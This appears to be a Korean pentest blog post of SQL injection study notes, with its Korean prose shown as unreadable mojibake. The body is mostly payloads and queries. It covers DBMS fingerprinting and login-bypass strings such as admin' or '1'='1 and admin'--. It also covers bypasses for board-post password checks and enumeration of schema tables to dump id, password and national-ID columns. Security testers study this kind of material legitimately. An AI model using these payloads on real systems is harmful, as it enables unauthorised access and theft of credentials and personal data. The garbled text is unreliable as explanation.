---
toc_sticky: true
layout: single
title: "SQL Injection ì·¨ì•½ì  ì ê²€"
categories: Pentest
tag: [Web, SQL Injection, Pentesting]
toc: true
toc_sticky: true
toc_label: ëª©ì°¨
author_profile: false
---

## 1ï¸âƒ£ SQL Injection ì·¨ì•½ì  ì ê²€



#### ğŸ“œ**SQL Injection**

- 1) ì—ëŸ¬ ìœ /ë¬´ í™•ì¸
  2) ì·¨ì•½ì  ìœ /ë¬´ í™•ì¸
       ê²€ìƒ‰ë€ì˜ ê²½ìš°, ì—°ê²°ì—°ì‚°ì ì‚¬ìš©
        a. ' ' ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (te' 'st), Mysql
        b. '+' ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (te'+'st), Mssql
        c. '||' ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (te'||'st), Oracle
  3) ì¡°ê±´ êµ¬ë¬¸ ì™„ì„±



#### ğŸ“œ**ë°©ë²•ë¡ **

- **1) ê²€ìƒ‰ê¸°ëŠ¥ì— ëŒ€í•œ ì·¨ì•½ì  ì ê²€**

   a. select * from board where title like '% '||(case when 1=1 then 'test' else 'aaaa' end)||' %'

    \> ê²°ê³¼ : '%'||'test'||'%' > '%test%'
    \> 1=2ì¼ë•Œ > '%aaaa%'


   b. select * from board where 1=1 and title like '%test%' => TRUE
     select * from board where 1=2 and title like '%test%' => TRUE


    \> ì»¬ëŸ¼ì´ë¦„ì´ë‚˜ í…Œì´ë¸”ì˜ ì´ë¦„ì˜ ê²½ìš°ëŠ” Preparedë¥¼ ì‚¬ìš©í•˜ì§€ ëª»í•˜ê³ , ì§ì ‘ ë¡œì§ì„ ë§Œë“¤ì–´ í•„í„°ë§ì„ í•´ì¤˜ì•¼í•¨
      ë”°ë¼ì„œ ê²€ìƒ‰ ë¶€ë¶„ì˜ íƒ€ì´í‹€, ì‘ì„±ì ë“± ë¶„ë¥˜í•´ì„œ ê²€ìƒ‰í•˜ëŠ” ê¸°ëŠ¥ì´ ìˆë‹¤ë©´ ê°€ëŠ¥ì„±ì´ ìˆìŒ

   




   c. select * from board where (case when 1=1 then 'test' else 'aaa' end) like '%test%' 


    \> ë²„í”„ì—ì„œ ì…ë ¥ì‹œ (case+when+1=1+then+'test'+else+'aaa'+end) ê³µë°±ì„ ë„£ì–´ì¤˜ì•¼í•¨

   




  **2) Prepared Statement í™˜ê²½ì—ì„œì˜ í…Œì´ë¸” íŒŒë¼ë¯¸í„°ì— ëŒ€í•œ ì·¨ì•½ì  ì ê²€ (JAVA Web í™˜ê²½)**

   

   a. 127.0.0.1:8080/security/example.jsp?tbname=ex_member ê°€ ìˆì„ ê²½ìš°, ë‘ê°€ì§€ê°€ ì¡´ì¬í•¨

   

    \> select * from tbname
    
     \- 127.0.0.1:8080/security/example.jsp?tbname=all_tablesë¡œ ë°”ê¿”ì„œ ë³´ë‚¼ ê²½ìš°, 

  â€‹    Table Nameì´ ëœ¨ë©´ 100% from ì ˆì— ìˆëŠ” ê²ƒì„. ë˜í•œ Oracle ì‚¬ìš©ì¤‘ ì„ì„ ì•Œ ìˆ˜ ìˆë‹¤.

   

    \> select * from board where tbname = '~~' 
     \- prepared statement ëŠ” table nameì— ì ìš©ë  ìˆ˜ ì—†ë‹¤ . ë”°ë¼ì„œ select * from ex_member where id = ?

  â€‹    ì´ëŸ°ì‹ìœ¼ë¡œ table nameì´ ì•„ë‹ˆë¼ idì™€ ê°™ì€ ì»¬ëŸ¼ëª…ì— ì ìš©ì‹œì¼œì•¼ í•¨. 
     \- ì´ëŸ´ê²½ìš° select * from ex_member (where 1=1 and id = ? --) where id = ? ì™€ ê°™ì´ table nameì— ëŒ€í•˜ì—¬ sql       injectionì„ ìˆ˜í–‰ í•  ìˆ˜ ìˆìŒ

   

    \> ë‹¤ë¥¸ ë°©ë²•ë„ ìˆìŒ (ë” ì‰¬ì›€)
     \- select * from ex_member where id = ?
     \- select * from (select * from ex_member where 1=1 ë˜ëŠ” 1=2) ex_member where id = ? sub ì¿¼ë¦¬ë¥¼ í†µí•˜ì—¬

  â€‹    í•œë²ˆ ë” ì‹¤í–‰ ë˜ë„ë¡ í•˜ë©´ ê°’ì´ ê°™ì•„ì§„ë‹¤. 

   

  **3) ì¸ì¦ìš°íšŒ ê³µê²©**

   a. IDë¥¼ ì•Œê²½ìš° - in-line query, Terminating query

    \> in-line query
     \- "select * from member where id='{$id}' and pw='{$pw}'"
     \- "select * from member where id=' (admin' or '1'='1) ' and pw='{$pw}'"

  



    \> Terminating query
     \- "select * from member where id='{$id}' and pw='{$pw}'"
     \- "select * from member where id=' (admin' -- ) ' and pw='{$pw}'"
     \- "select * from member where id=' (admin'#) ' and pw='{$pw}'"

   **mysql ì£¼ì„ë¬¸ì: --, #
   ** --ì˜ ê²½ìš° [ê³µë°±]--[ê³µë°±] ì´ì–´ì•¼ í•¨

   b. IDë¥¼ ëª¨ë¥¼ê²½ìš° - in-line query, Terminating query

    \> in-line query
     \- "select * from member where id='{$id}' and pw='{$pw}'"
     \- "select * from member where id=' (test' or 1=1 or '1'='1) ' and pw='{$pw}'"
    
    \> Terminating query
     \- "select * from member where id='{$id}' and pw='{$pw}'"
     \- "select * from member where id=' (test' or '1'='1' -- ) ' and pw='{$pw}'"
     \- "select * from member where id=' (test' or '1'='1'#) ' and pw='{$pw}'"

   c. ë¹„ë°€ê¸€ ë¹„ë°€ë²ˆí˜¸ ë¶€ë¶„ 

    \> select * from board where idx=6 and pw='{$pw}'
      select * from board where idx=6 and pw=' (' or '1'='1) ' 
     \- ëª¨ë“  ê²°ê³¼ê°€ ì°¸ì´ ë˜ë¯€ë¡œ... table ì•ˆì— ì²«ë²ˆì§¸ ê²Œì‹œê¸€ì´ ë‚˜ì˜¤ê²Œë¨
    
    \> select * from board where idx=6 and pw=' (' or idx=8 -- ) '
     \- í•´ì‰¬í™”ë¥¼ ì‹œì¼œ ì €ì¥í•  ê²½ìš°
        \1. application ë‹¨ì—ì„œ í•´ì‹œí™”
         \> ì‹±ê¸€ ì¿¼í„°(')ë¡œ íŒë³„ ê°€ëŠ¥ > ì…ë ¥ì‹œ ì˜¤ë¥˜ ì—†ìŒ > ì‹±ê¸€ì¿¼í„°ë„ í¬í•¨í•˜ì—¬ md5 ë³€í™˜ë˜ì–´ ì„œë²„ë¡œ ì „ì†¡

  â€‹       \> sql injection ë¶ˆê°€
  â€‹      \2. DBMS ë‹¨ì—ì„œ í•´ì‹œí™”
  â€‹       \> ì‹±ê¸€ ì¿¼í„°(')ë¡œ íŒë³„ ê°€ëŠ¥ > ì…ë ¥ ì‹œ ì˜¤ë¥˜. (ex. md5() <- ê´„í˜¸ ì•ˆì— ' ë“¤ì–´ê°€ë©´ ì˜¤ë¥˜ ìƒê¹€) > sql injectionê°€ëŠ¥

   d. ê²Œì‹œê¸€ ìˆ˜ì •

   

    \> update êµ¬ë¬¸ì— Password ê²€ì¦ ì¿¼ë¦¬ ì˜ˆì¸¡
    
     \- UPDATE board SET title=..., content=..., data=... WHERE idx=7 and password={$pw}
      UPDATE board SET title=..., content=..., data=... WHERE idx=7 and password=' (' or '1'='1) '

  â€‹    (ì „ì²´ êµ¬ë¬¸ì— ì˜í–¥ì„ ë¯¸ì¹  ìˆ˜ ìˆìŒ..) 
  â€‹    UPDATE board SET title=..., content=..., data=... WHERE idx=7 and password='' (or idx=7 -- ) '

  â€‹    (ë”°ë¼ì„œ idx ë¥¼ ì§€ì •í•´ì£¼ëŠ” ì¿¼ë¦¬ë¥¼ ì‘ì„± í•˜ì)

   

    \> update êµ¬ë¬¸ì „ password ê²€ì¦
     \- select * from board where idx=7 and password='' í›„ì— ìˆ˜ì • í˜ì´ì§€ ë“¤ì–´ê°„ í›„ ìˆ˜ì •

  




   e. ê²Œì‹œê¸€ ì‚­ì œ

    \> delete êµ¬ë¬¸ì— password ê²€ì¦ ì¿¼ë¦¬ ì˜ˆì¸¡
     \- delete from where idx=7 and password=''

  




  **4) ë°ì´í„° ì¡°íšŒ ê¸°ë²•**

   a. DBMS íŒŒì•…
    

    \> ì—ëŸ¬ë¥¼ í†µí•œ íŒŒì•…
    \> ì—°ê²° ì—°ì‚°ìë¥¼ í†µí•œ íŒŒì•… (ëŒ€ë¶€ë¶„ ì—°ê²° ì—°ì‚°ìë¡œ ë§ì´ ë¨) : **Oracle(||), MSSQL(+(%2bë¡œ ì‚¬ìš©)), MySQL(ê³µë°±)**
     \- (MSSQL)
       ?idx=192 and 'test'='te'+'st' (MSSQL) (burp ì—ì„œëŠ” > ?idx=192+and+'test'='te'%2b'st' )
     \- (ORCLE)
       ê²€ìƒ‰ì–´ì— > t'||(case when 1=1 then 'e' else 'a' end)||'st
    \> í•¨ìˆ˜ë¥¼ í†µí•œ íŒŒì•…
     \- MySQL - now(), mid() > (?idx=7 and mid('test',1,1)='t') > **mid í•¨ìˆ˜ì˜ ê²½ìš° mysql ë§Œ ìˆìŒ**
     \- MSSQL - len(), substring() > **len() í•¨ìˆ˜ì˜ ê²½ìš° mssql ë§Œ ìˆìŒ**
     \- ORACLE - substr()
    \> ë”ë¯¸ í…Œì´ë¸”ì„ í†µí•œ íŒŒì•…
     \- ORACLE - select 1 from dual > (?idx=(select 192 from dual))ë¡œ ì¡°íšŒì‹œ 192ë²ˆ ê¸€ì´ ì¡°íšŒ ë˜ì—ˆë‹¤ë©´... ê°€ëŠ¥ì„± ë†’ìŒ
     \- DB2 - select 1 from sysibm.sysdummy1

  ** JSP, JAVA ì‚¬ìš© ì‹œ, ORACLE
  ** PHP ì‚¬ìš©ì‹œ, Mysql ì‚¬ìš© ê°€ëŠ¥ì„± ë†’ìŒ

   b. ê³µê²© ì í•©ì„± ê²€í† 
    

    \> DBMS ì—ëŸ¬ ì¶œë ¥ ìœ /ë¬´ íŒŒì•… = error base
    \> DB ë°ì´í„° ì›¹í˜ì´ì§€ ì¶œë ¥ ìœ /ë¬´ íŒŒì•…(ê²€ìƒ‰ê¸°ëŠ¥ì— ì í•©) = union base 
     \> t4 ë¡œ ê²€ìƒ‰í–ˆëŠ”ë° test4ê°€ ê²€ìƒ‰ë  ê²½ìš°
    \> ìœ„ ë‘˜ë‹¤ ì•ˆë˜ë©´ .... Blind

   




   c. MySQL ë°ì´í„° ì¡°íšŒ

   

    \> 1. ìˆœì°¨ì  ì ‘ê·¼(DBëª©ë¡í™”, Table ëª©ë¡í™”, ì»¬ëŸ¼ ëª©ë¡í™”),

   




  â€‹     \* DB ëª©ë¡í™” :

  â€‹      select * from information.schema.schemata

  â€‹      select schema_name from information.schema.schemata
  â€‹      **(information_schema DB ì•ˆì— schemata í…Œì´ë¸”ì— ìˆëŠ” ì»¬ëŸ¼ "SCHEMA_NAME"ì€ DB ì´ë¦„ì´ë‹¤.)
  â€‹      (information_schema DBì•ˆì— tables, columns ì•ˆì— ìˆëŠ” ì»¬ëŸ¼ "table_schema"ëŠ” DB ì´ë¦„ì´ë‹¤.)**

   

  â€‹     \* Table ëª©ë¡í™” :

  â€‹      select table_name from information_schema.tables where table_schema='board'

   

  â€‹     \* Column ëª©ë¡í™” :

  â€‹      select * from information_schema.columns where table_shema='board' and table_name='members';

   

  â€‹     \* ë°ì´í„° ì¡°íšŒ :

  â€‹      select idx, id, password, jumin from board.members;

   

     \> 2. ë¹„ìˆœì°¨ì ì ‘ê·¼ (ëª©ì ì— ë”°ë¼ ì ‘ê·¼í•˜ëŠ” ì •ë³´ë¶€í„°...)

   




  â€‹     \* ì›í•˜ëŠ” í…Œì´ë¸” ì´ë¦„ ì¶œë ¥ :

  â€‹      select table_name from information_schema.tables where table_schema='board'

  â€‹      and table_name like '%mem%';

  â€‹      -> ì›í•˜ëŠ” í…Œì´ë¸” ì´ë¦„ ì¶œë ¥ í›„, ìˆœì°¨ì ìœ¼ë¡œ Column ëª©ë¡í™”, ë°ì´í„° ì¡°íšŒ ì‹¤í–‰

  â€‹     

  â€‹     \* ì›í•˜ëŠ” ì»¬ëŸ¼ ê´€ë ¨ ì¶œë ¥(id ë“±..) :

  â€‹      select table_name, column_name from information_schema.columns where table_schema='board' and 
  â€‹      column_name like '%id%';

   

   d. MSSQL ë°ì´í„° ì¡°íšŒ

   

    \> 1. ìˆœì°¨ì  ì ‘ê·¼ 

   




  â€‹     \* ìˆœì°¨ì  ë ˆì½”ë“œ ì¶œë ¥ : (topì€ í…Œì´ë¸”ì˜ ë ˆì½”ë“œë¥¼ ì¡°íšŒí• ë•Œ ê²°ê³¼ì¤‘ ìƒìœ„ ëª‡ê°œë§Œ í‘œê¸°í•˜ê¸° ìœ„í•´ ì‚¬ìš©í•˜ëŠ” êµ¬ë¬¸)

  â€‹      select top 3 name from sysdatabases; >> 3ê°œì˜ ê²°ê³¼ê°’ì´ ë‚˜ì˜´

  â€‹      

  â€‹     (ORDER BY ì‚¬ìš©)
  â€‹      select top 1 name from (select **top 1** name from sysdatabases order by name)**a** order by name desc; 

  â€‹      \> ì²«ë²ˆì§¸ ë ˆì½”ë“œ ì¶œë ¥   **ìƒìœ„ topì ˆì€ ë¬´ì¡°ê±´ 1**                   **ë³„ì¹­ í•„ìˆ˜**

  â€‹      select top 1 name from (select top 2 name from sysdatabases order by name)a order by name desc;
  â€‹      \> ë‘ë²ˆì§¸ ë ˆì½”ë“œ ì¶œë ¥      

  â€‹      select top 1 name from (select top 3 name from sysdatabases order by name)a order by name desc; 
  â€‹      \> ì„¸ë²ˆì§¸ ë ˆì½”ë“œ ì¶œë ¥

   

  â€‹     (NOT IN ì‚¬ìš©)

  â€‹      select top 1 name from sysdatabases; >> masterë¼ëŠ” ë ˆì½”ë“œ í•˜ë‚˜ ì¶œë ¥

  â€‹      select top 1 name from sysdatabases where name not in ('master'); >> masterë¼ëŠ” ë ˆì½”ë“œ ì œì™¸ í›„ ìƒìœ„ ì¶œë ¥

  â€‹      select top 1 name from sysdatabases where name not in ('master', 'tempdb');

  â€‹      ** ë ˆì½”ë“œê°€ ë„ˆë¬´ ë§ì„ë•ŒëŠ” ê³„ì† ì¶”ê°€ë˜ì•¼ í•˜ë¯€ë¡œ ê¸¸ì–´ì§ >> ë”°ë¼ì„œ NOT IN ì—°ì‚°ì ì•ˆì— ì„œë¸Œì¿¼ë¦¬ ì‚¬ìš© ê°€ëŠ¥

  â€‹      select top 1 name from sysdatabases where name not in (select top **0** name from sysdatabases);

  â€‹      \> ì²«ë²ˆì§¸ ë ˆì½”ë“œ ì¶œë ¥                       **ì„œë¸Œì¿¼ë¦¬ top ì ˆì€ 0ë¶€í„° ì‹œì‘**

  â€‹      select top 1 name from sysdatabases where name not in (select top 1 name from sysdatabases);

  â€‹      \> ì²«ë²ˆì§¸ ë ˆì½”ë“œ ì œì™¸í•˜ê³  ì œì¼ ìƒìœ„ì— ìˆëŠ” ë ˆì½”ë“œ ì¶œë ¥

  â€‹      select top 1 name from sysdatabases where name not in (select top 2 name from sysdatabases);

  â€‹      \> ì²«ë²ˆì§¸, ë‘ë²ˆì§¸ ë ˆì½”ë“œ ì œì™¸í•˜ê³  ì œì¼ ìƒìœ„ì— ìˆëŠ” ë ˆì½”ë“œ ì¶œë ¥     

   

  â€‹     (ROW_NUMBER() ì‚¬ìš©) >> 2005 ì´ìƒë¶€í„° ì‚¬ìš©ê°€ëŠ¥!! 

  â€‹      ** row_number() >> ë ˆì½”ë“œë³„ë¡œ ìˆœì°¨ì ìœ¼ë¡œ ì¹´ìš´íŒ… í•´ì¤Œ

  â€‹      select name from (select ROW_NUMBER() over(order by name)num, name from sysdatabases)a

  â€‹      where a.num=1; >> ì²«ë²ˆì§¸ ë ˆì½”ë“œ ì¶œë ¥

  â€‹      select name from (select ROW_NUMBER() over(order by name)num, name from sysdatabases)a

  â€‹      where a.num=1; >> ë‘ë²ˆì§¸ ë ˆì½”ë“œ ì¶œë ¥

  

  **5) DBMSë³„ ë°ì´í„° ì‚¬ì „** 

   

   a. MYSQL**
  **

    \> Information_schema.schemata / Information_schema.tables / Information_schema.columns

   




   b. MSSQL

    \> sysdatabases(Master DBì— ì¡´ì¬) / sysobjects (ê° ì‚¬ìš© DBì— ì¡´ì¬) / syscolumns (ê° ì‚¬ìš© DBì— ì¡´ì¬)
    
    \> (MSSQL 2005 ì´ìƒ) : sys.databases / sys.objects / sys.columns
    
    \> Information_schema.schemata / Information_schema.tables / Information_schema.columns

   




   c. ORACLE

    \> all_tables / all_tab_columns

   




  **6) DBMSë³„ ë©”íƒ€ë°ì´í„° ëª©ë¡í™”**

   

    a. MYSQL
    
     \> ìˆœì°¨ì  ì ‘ê·¼ :

   




  ```
  #DB ëª©ë¡í™”
  select * from information_schema.SCHEMATA;
  select schema_name from information_schema.SCHEMATA; # DB ëª©ë¡í™”, schema_name : DBëª…
  
  #TABLE ëª©ë¡í™”
  select * from information_schema.tables where table_schema="board"; # table_schema : DB ëª…
  select table_name from information_schema.tables where table_schema="board"; # table_schema : DB ëª…
  
  #COLUMN ëª©ë¡í™”
  select * from information_schema.columns;
  select * from information_schema.COLUMNS where table_schema="board" and table_name="members"; # table_schema : DB ëª…
  
  #DATA ì¡°íšŒ
  select id, idx, password from board.members;
  ```

   

    \> ë¹„ìˆœì°¨ì  ì ‘ê·¼ : í…Œì´ë¸”, ì»¬ëŸ¼ ë“±ì„ ëª©ì ì— ë§ëŠ” ê²ƒë¶€í„° ì¡°íšŒ ì‹œë„
                **í…Œì´ë¸” : mem, user, file, session, employee, admin ..

  â€‹              **ì»¬ëŸ¼ : id, pw, pass, jumin, ssn, admin, card ..

   

  ```
  #TABLE ëª©ë¡í™”
  select table_name from information_schema.tables where table_schema="board" and table_name like '%mem%';
  
  #COLUMN ëª©ë¡í™”
  select table_name, column_name from information_schema.COLUMNS where table_schema="board" and column_name like '%id%';
  ```
